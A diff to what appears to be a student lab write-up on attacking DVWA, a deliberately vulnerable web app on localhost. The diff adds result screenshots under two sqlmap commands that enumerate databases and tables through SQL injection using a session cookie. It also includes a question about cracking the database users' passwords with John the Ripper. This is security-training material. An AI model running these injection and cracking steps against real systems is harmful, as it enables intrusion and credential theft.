@@ -235,6 +235,10 @@ Before Attack
 ```
 python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" --dbs
 ```
+Result
+![image](https://github.com/user-attachments/assets/73f98421-17f6-48e6-beac-eb6120d7dc8f)
+
+![image](https://github.com/user-attachments/assets/ac7f1d6c-f5e1-433e-87d2-d4a3ea33ac63)
 
 
 
@@ -246,9 +250,16 @@ Before Attack
 ![image](https://github.com/user-attachments/assets/503d942b-fbb9-495e-afd0-6cc4131f58d6)
 
 
+
 ```
 python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa --tables
 ```
+Result
+![image](https://github.com/user-attachments/assets/2115aafc-d34b-4bef-8d16-b6ce64b7cd2d)
+
+![image](https://github.com/user-attachments/assets/4273d2fd-2537-497d-b961-1445f593d8c4)
+
+
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
 
